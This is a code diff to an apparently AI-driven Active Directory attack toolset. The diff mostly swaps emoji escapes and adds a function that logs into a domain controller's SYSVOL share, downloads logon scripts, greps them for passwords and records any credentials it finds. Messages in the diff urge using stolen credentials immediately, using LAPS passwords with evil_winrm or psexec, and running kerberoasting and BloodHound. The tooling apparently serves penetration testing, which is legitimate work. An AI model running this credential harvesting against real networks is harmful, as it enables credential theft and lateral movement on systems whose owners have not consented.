@@ -301,7 +301,7 @@ class CredentialDiscoveryTools(Toolset):
             if "description:" in result.lower():
                 logger.warning("[!] Found users with descriptions - CHECK FOR PASSWORDS!")
                 result = (
-                    "\ud83d\udea8 USERS WITH DESCRIPTIONS FOUND - CHECK FOR PASSWORDS!\n"
+                    "🚨 USERS WITH DESCRIPTIONS FOUND - CHECK FOR PASSWORDS!\n"
                     "\u2192 Common pattern: user 'dave.lee' has password 'ExamplePass123!' in description\n"
                     "\u2192 Test any found credentials immediately with domain_admin_checker\n\n"
                     + result
@@ -437,7 +437,7 @@ class CredentialDiscoveryTools(Toolset):
             if matching_creds:
                 logger.warning("[!] PASSWORD SPRAY FOUND VALID CREDENTIALS!")
                 result = (
-                    "\ud83d\udea8 VALID CREDENTIALS FOUND!\n"
+                    "🚨 VALID CREDENTIALS FOUND!\n"
                     "\u2192 Look for [+] lines indicating successful auth\n"
                     "\u2192 'Pwn3d!' indicates ADMIN access\n"
                     "\u2192 Use found credentials for further recon\n\n" + result
@@ -591,7 +591,7 @@ class CredentialDiscoveryTools(Toolset):
                     ", ".join(accounts),
                 )
                 result = (
-                    "\ud83d\udea8 USERNAME=PASSWORD FOUND!\n"
+                    "🚨 USERNAME=PASSWORD FOUND!\n"
                     f"\u2192 Accounts: {', '.join(accounts)}\n"
                     "\u2192 Common examples: user1:user1, guest:guest\n"
                     "\u2192 Use found credentials for kerberoast, asrep_roast, bloodhound\n\n"
@@ -789,7 +789,7 @@ class CredentialDiscoveryTools(Toolset):
             if "password" in result.lower() or "laps" in result.lower():
                 logger.info("[+] LAPS passwords retrieved!")
                 result = (
-                    "\ud83d\udccb LAPS PASSWORDS RETRIEVED\n"
+                    "📋 LAPS PASSWORDS RETRIEVED\n"
                     "\u2192 These are local Administrator passwords for specific computers\n"
                     "\u2192 Use with evil_winrm or psexec against the target computer\n\n" + result
                 )
@@ -1747,7 +1747,7 @@ class SharePilferingTools(Toolset):
 
             if interesting_files:
                 result = (
-                    "\ud83d\udcc1 INTERESTING FILES FOUND:\n"
+                    "📁 INTERESTING FILES FOUND:\n"
                     + "\n".join(interesting_files[:50])
                     + "\n\n"
                     + result
@@ -1811,7 +1811,7 @@ class SharePilferingTools(Toolset):
             if "password" in result.lower() or "cpassword" in result.lower():
                 logger.warning("[!] GPP passwords found!")
                 result = (
-                    "\ud83d\udea8 GPP PASSWORDS FOUND!\n"
+                    "🚨 GPP PASSWORDS FOUND!\n"
                     "\u2192 These are decrypted Group Policy Preferences passwords\n"
                     "\u2192 Use found credentials immediately\n\n" + result
                 )
@@ -1820,6 +1820,177 @@ class SharePilferingTools(Toolset):
 
         except Exception as e:
             return f"GPP password search failed: {e}"
+
+    @dn.tool_method
+    def sysvol_script_search(  # noqa: PLR0912
+        self,
+        target: str,
+        username: str,
+        password: str,
+        domain: str,
+    ) -> str:
+        """
+        Search SYSVOL scripts for plaintext passwords (LOW HANGING FRUIT).
+
+        SYSVOL often contains logon scripts, batch files, and PowerShell scripts
+        with hardcoded credentials. This is a common misconfiguration in AD environments.
+
+        **RUN THIS EARLY** - Very high success rate in environments with legacy scripts.
+
+        Args:
+            target: Domain controller IP
+            username: Username for authentication
+            password: Password for authentication
+            domain: Domain for authentication
+
+        Returns:
+            Scripts containing potential credentials
+
+        Example:
+            >>> sysvol_script_search("192.168.56.10", "user", "pass", "domain.local")
+        """
+        resolved_password = self._resolve_password(username, domain, password)
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
+        results: list[str] = []
+
+        # Use netexec spider to search SYSVOL for script files
+        # Spider SYSVOL share looking for scripts with password-related content
+        spider_cmd = [
+            "netexec",
+            "smb",
+            target,
+            "-u",
+            username,
+            "-p",
+            resolved_password or "",
+            "-d",
+            domain,
+            "-M",
+            "spider_plus",
+            "-o",
+            "EXCLUDE_DIR=Policies",  # Skip policies (covered by gpp_password)
+        ]
+
+        try:
+            logger.info(f"[*] Searching SYSVOL scripts for passwords in {domain}")
+
+            # First, enumerate and download scripts from SYSVOL/scripts folder
+            script_extensions = ["*.bat", "*.cmd", "*.ps1", "*.vbs", "*.wsf", "*.inf"]
+
+            # Use smbclient to list and cat script files
+            for ext in script_extensions:
+                list_cmd = [
+                    "smbclient.py",
+                    f"{domain}/{username}:{resolved_password}@{target}",
+                    "-c",
+                    f"use SYSVOL; cd {domain}\\scripts; ls {ext}",
+                ]
+                stdout, stderr, _ = run_tool(list_cmd, timeout_seconds=60)
+                output = stdout + "\n" + (stderr or "")
+
+                # Extract script filenames from smbclient output
+                script_files: list[str] = []
+                for line in output.splitlines():
+                    # smbclient lists files like: "filename.bat  A  1234  date"
+                    if ext.replace("*", "") in line.lower():
+                        parts = line.strip().split()
+                        if parts:
+                            script_files.append(parts[0])
+
+                # Download and search each script for passwords
+                for script_file in script_files[:20]:  # Limit to prevent timeout
+                    cat_cmd = [
+                        "smbclient.py",
+                        f"{domain}/{username}:{resolved_password}@{target}",
+                        "-c",
+                        f"use SYSVOL; cd {domain}\\scripts; get {script_file} /tmp/sysvol_script.txt",
+                    ]
+                    run_tool(cat_cmd, timeout_seconds=30)
+
+                    # Search the downloaded file for password patterns
+                    grep_cmd = [
+                        "bash",
+                        "-lc",
+                        "grep -iE '(password|passwd|pwd|cred|secret)\\s*[=:]' /tmp/sysvol_script.txt 2>/dev/null || true",
+                    ]
+                    grep_stdout, _grep_stderr, _ = run_tool(grep_cmd, timeout_seconds=10)
+                    grep_output = grep_stdout.strip()
+
+                    if grep_output:
+                        results.append(f"\n📄 {script_file}:\n{grep_output}")
+
+            # Also use netexec's spider to find any files with passwords
+            stdout, stderr, _ = run_tool(spider_cmd, timeout_seconds=300)
+            spider_output = stdout + "\n" + (stderr or "")
+
+            # Combine results
+            if results:
+                credential_output = "\n".join(results)
+                logger.warning("[!] Potential passwords found in SYSVOL scripts!")
+
+                # Try to extract specific credentials
+                for line in credential_output.splitlines():
+                    # Look for patterns like: net use * \\server\share /user:domain\user password
+                    net_use_match = re.search(
+                        r"/user:([^\s]+)\s+([^\s]+)",
+                        line,
+                        re.IGNORECASE,
+                    )
+                    if net_use_match:
+                        found_user = net_use_match.group(1)
+                        found_pass = net_use_match.group(2)
+                        if "\\" in found_user:
+                            found_domain, found_user = found_user.rsplit("\\", 1)
+                        else:
+                            found_domain = domain
+                        self._add_credential(
+                            found_user,
+                            found_pass,
+                            found_domain,
+                            "sysvol_script",
+                        )
+
+                    # Look for patterns like: password=value or pwd:value
+                    pwd_match = re.search(
+                        r"(?:password|passwd|pwd)\s*[=:]\s*[\"']?([^\s\"']+)[\"']?",
+                        line,
+                        re.IGNORECASE,
+                    )
+                    if pwd_match:
+                        found_pass = pwd_match.group(1)
+                        # Look for associated username on same line
+                        user_match = re.search(
+                            r"(?:user|username|usr)\s*[=:]\s*[\"']?([^\s\"']+)[\"']?",
+                            line,
+                            re.IGNORECASE,
+                        )
+                        if user_match:
+                            found_user = user_match.group(1)
+                            self._add_credential(
+                                found_user,
+                                found_pass,
+                                domain,
+                                "sysvol_script",
+                            )
+
+                return (
+                    "🚨 POTENTIAL PASSWORDS FOUND IN SYSVOL SCRIPTS!\n"
+                    "\u2192 Review the following files for credentials\n"
+                    "\u2192 Check for net use, runas, or variable assignments\n\n"
+                    + credential_output
+                    + "\n\nSpider output:\n"
+                    + spider_output
+                )
+
+            return (
+                "[*] No obvious passwords found in SYSVOL scripts.\n"
+                "Spider output:\n" + spider_output
+            )
+
+        except Exception as e:
+            return f"SYSVOL script search failed: {e}"
 
     @dn.tool_method
     def ntds_dit_extract(
